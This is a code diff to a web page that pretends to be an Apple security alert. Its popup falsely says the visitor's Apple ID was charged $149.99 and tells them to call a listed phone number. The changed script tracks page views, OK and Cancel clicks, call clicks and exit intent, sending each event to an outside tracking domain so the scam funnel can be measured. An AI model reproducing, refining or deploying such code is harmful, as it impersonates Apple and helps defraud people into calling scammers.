@@ -371,69 +371,72 @@ hs.src = ('//s10.histats.com/js15_as.js');
 <script defer="" data-domain="iosmd.sire" src="js/script.js"></script>
 
 <script>
-// ========== REDTRACK MONEY PAGE TRACKING ==========
+// ========== REDTRACK MONEY PAGE - RTKCID FIXED ==========
 (function() {
-  // Parse ExoClick/RedTrack params from URL
+  console.log('🔍 RedTrack tracking loading...');
+  
+  // FIXED: Use rtkcid from your URL
   const params = new URLSearchParams(window.location.search);
-  const clickid = params.get('ref_id')  params.get('clickid')  params.get('cid');
-  const zoneId = params.get('sub7')  params.get('zone_id')  params.get('zone') || 'unknown';
+  const clickid = params.get('rtkcid');
+  const zoneId = params.get('sub7') || 'unknown';
+  
+  console.log('🔑 Found rtkcid:', clickid);
+  console.log('📍 Zone:', zoneId);
 
-  function sendEvent(eventName, revenue = 0) {
-    if (!clickid) {
-      console.log('No clickid - skip', eventName);
-      return;
-    }
-    
+  if (!clickid) {
+    console.error('❌ No rtkcid found');
+    return;
+  }
+
+  function sendEvent(eventName) {
     const url = https://trk.adultdatedesire.site/postback? +
       clickid=${encodeURIComponent(clickid)}& +
       event=${encodeURIComponent(eventName)}& +
-      zone=${encodeURIComponent(zoneId)}& +
-      revenue=${revenue};
+      zone=${encodeURIComponent(zoneId)};
     
+    console.log('📤 Firing:', eventName);
     new Image().src = url;
-    console.log('✅ Money Event:', eventName, 'Zone:', zoneId);
   }
 
-  // 1. Track PAGE VIEW
+  // 🔥 IMMEDIATE PAGE VIEW (will show instantly)
   sendEvent('money_page_view');
 
-  // 2. WRAP YOUR EXISTING myFunction() - OK vs Cancel tracking
+  // 1. WRAP myFunction() - OK vs CANCEL tracking
   const originalMyFunction = window.myFunction;
   window.myFunction = function() {
     const msg = "Your Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security.Not you? Immediately call Apple Support +1-844-449-5991 to Freeze it!.";
     
     if (confirm(msg)) {
-      // ✅ OK clicked
+      console.log('✅ OK clicked');
       sendEvent('money_ok_click');
     } else {
-      // ✅ Cancel clicked  
+      console.log('❌ Cancel clicked');
       sendEvent('money_cancel_click');
     }
     
-    // Run original function (triggers okkkk() for call tracking)
+    // Always call okkkk() as per your original code
     if (originalMyFunction) originalMyFunction();
   };
 
-  // 3. WRAP YOUR EXISTING okkkk() - Call click tracking
+  // 2. WRAP okkkk() - CALL CLICK tracking
   const originalOkkkk = window.okkkk;
   window.okkkk = function() {
-    // ✅ Call initiated
+    console.log('📞 Call initiated');
     sendEvent('money_call_click');
     
-    // Run your original dialer
     if (originalOkkkk) originalOkkkk();
   };
 
-  // 4. EXIT INTENT (mouse leaves top)
-  let exitTracked = false;
-  document.addEventListener('mouseleave', function(e) {
-    if (e.clientY <= 0 && !exitTracked) {
-      exitTracked = true;
+  // 3. EXIT INTENT
+  let exitFired = false;
+  document.addEventListener('mouseleave', (e) => {
+    if (e.clientY <= 0 && !exitFired) {
+      exitFired = true;
       sendEvent('money_exit_intent');
     }
   });
 
-  console.log('🚀 RedTrack money tracking active | Zone:', zoneId, 'ClickID:', clickid);
+  console.log('🚀 RedTrack READY | rtkcid:', clickid);
 })();
 </script>
 </body></html>
